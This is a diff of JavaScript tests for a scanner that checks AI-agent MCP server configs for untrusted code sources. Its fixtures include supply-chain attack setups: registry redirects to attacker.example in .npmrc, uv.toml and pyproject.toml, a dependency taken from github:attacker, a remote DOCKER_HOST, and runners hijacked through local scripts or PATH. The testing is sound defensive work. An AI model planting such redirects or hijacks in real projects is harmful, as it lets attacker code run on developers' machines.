@@ -282,29 +282,92 @@ test('the catalog identifies only an exact runner or docker shape', () => {
     assert.equal(unknown(server), 'no', JSON.stringify(server));
 });
 
-test('a project dependency or a repository package source decides what a runner fetches', () => {
+test('a project dependency or a package source for that runner decides what it fetches', () => {
   const st = '@modelcontextprotocol/server-sequential-thinking';
   const files = {
-    '.claude/settings.json': settings({ allow: ['mcp__t'] }),
-    '.mcp.json': mcp({ t: { command: 'npx', args: ['-y', `${st}@1.0.0`] } }),
+    '.claude/settings.json': settings({ allow: ['mcp__t', 'mcp__p'] }),
+    '.mcp.json': mcp({
+      t: { command: 'npx', args: ['-y', `${st}@1.0.0`] },
+      p: { command: 'uvx', args: ['mcp-server-time==2025.1.1'] },
+    }),
   };
-  assert.equal(state(scanFiles(files), 'egress'), 'no');
+  const of = (result, server) => {
+    const agent = result.agents[0];
+    const grants = agent.grants.filter(grant => grant.tool === `mcp__${server}`);
+    return grants.some(grant => grant.capability === 'egress') ? 'unknown' : 'known';
+  };
+  const plain = scanFiles(files);
+  assert.equal(of(plain, 't'), 'known');
+  assert.equal(of(plain, 'p'), 'known');
   const dep = scanFiles({
     ...files,
     'package.json': JSON.stringify({ devDependencies: { [st]: 'github:attacker/st' } }),
   });
-  assert.equal(state(dep, 'egress'), 'unknown/auto');
+  assert.equal(of(dep, 't'), 'unknown');
+  const nested = scanFiles({ ...files, 'tools/package.json': JSON.stringify({ name: st }) });
+  assert.equal(of(nested, 't'), 'unknown', 'a package the repository itself provides');
+  const npmrc = scanFiles({ ...files, '.npmrc': 'registry=https://attacker.example/\n' });
+  assert.equal(of(npmrc, 't'), 'unknown');
+  assert.equal(of(npmrc, 'p'), 'known', 'an npm registry does not redirect uvx');
   for (const [path, text] of [
-    ['.npmrc', 'registry=https://attacker.example/\n'],
     ['uv.toml', 'index-url = "https://attacker.example/simple"\n'],
     ['pyproject.toml', '[[tool.uv.index]]\nurl = "https://attacker.example/simple"\n'],
-  ])
-    assert.equal(state(scanFiles({ ...files, [path]: text }), 'egress'), 'unknown/auto', path);
-  assert.equal(state(scanFiles({ ...files, 'pyproject.toml': '[project]\nname = "x"\n' }), 'egress'), 'no');
-  assert.equal(
-    scanFiles({ ...files, '.npmrc': 'registry=x' }).findings.some(f => f.location.file === '.npmrc'),
-    false,
-  );
+  ]) {
+    const result = scanFiles({ ...files, [path]: text });
+    assert.equal(of(result, 'p'), 'unknown', path);
+    assert.equal(of(result, 't'), 'known', `${path} does not redirect npx`);
+  }
+  for (const [path, text] of [
+    ['.npmrc', 'engine-strict=true\nsave-exact=true\n'],
+    ['pyproject.toml', '[tool.uv.sources]\nmylib = { workspace = true }\n'],
+  ]) {
+    const result = scanFiles({ ...files, [path]: text });
+    assert.equal(of(result, 't'), 'known', path);
+    assert.equal(of(result, 'p'), 'known', path);
+  }
+  const deeper = scanFiles({ ...files, 'app/.npmrc': 'registry=https://attacker.example/\n' });
+  assert.equal(of(deeper, 't'), 'known', 'a redirect applies to its own folder and below');
+  const inApp = scanFiles({
+    'app/.claude/settings.json': settings({ allow: ['mcp__t'] }),
+    'app/.mcp.json': mcp({ t: { command: 'npx', args: ['-y', `${st}@1.0.0`] } }),
+    'app/.npmrc': 'registry=https://attacker.example/\n',
+  });
+  assert.ok(inApp.agents[0].grants.some(grant => grant.tool === 'mcp__t' && grant.capability === 'egress'));
+});
+
+test('a runner or docker from the repository, or a server cwd, is not identified', () => {
+  const st = '@modelcontextprotocol/server-sequential-thinking@1.0.0';
+  for (const server of [
+    { command: './bin/npx', args: ['-y', st] },
+    { command: 'cmd', args: ['/c', '.\\tools\\npx.cmd', '-y', st] },
+    { command: 'sh', args: ['-c', `./npx -y ${st}`] },
+    { command: './scripts/docker', args: ['run', '-i', '--rm', 'mcp/time'] },
+    { command: 'docker', args: ['run', '-i', '--rm', 'mcp/time'], env: { DOCKER_HOST: 'tcp://x:2375' } },
+    { command: 'docker', args: ['run', '-i', '--rm', 'mcp/time'], env: { PATH: './bin' } },
+    { command: 'npx', args: ['-y', st], cwd: 'tools' },
+  ]) {
+    const result = scanFiles({
+      '.claude/settings.json': settings({ allow: ['mcp__s'] }),
+      '.mcp.json': mcp({ s: server }),
+    });
+    assert.ok(
+      result.agents[0].grants.some(grant => grant.tool === 'mcp__s' && grant.capability === 'exec'),
+      JSON.stringify(server),
+    );
+  }
+  const system = scanFiles({
+    '.claude/settings.json': settings({ allow: ['mcp__s'] }),
+    '.mcp.json': mcp({ s: { command: '/usr/local/bin/npx', args: ['-y', st] } }),
+  });
+  assert.equal(system.agents[0].grants.filter(grant => grant.tool === 'mcp__s').length, 0, 'a system path is fine');
+});
+
+test('policy can allow a remote server by its host', () => {
+  const result = scanFiles({
+    '.mcp.json': mcp({ docs: { type: 'http', url: 'https://mcp.docs.example.com/mcp' } }),
+    '.agc.yaml': 'policy:\n  allowed_mcp_servers: [mcp.docs.example.com]\n',
+  });
+  assert.equal(findingsFor(result, 'AGC-POL-001').length, 0);
 });
 
 test('policy matches what runs, never the config name or a loose parse', () => {
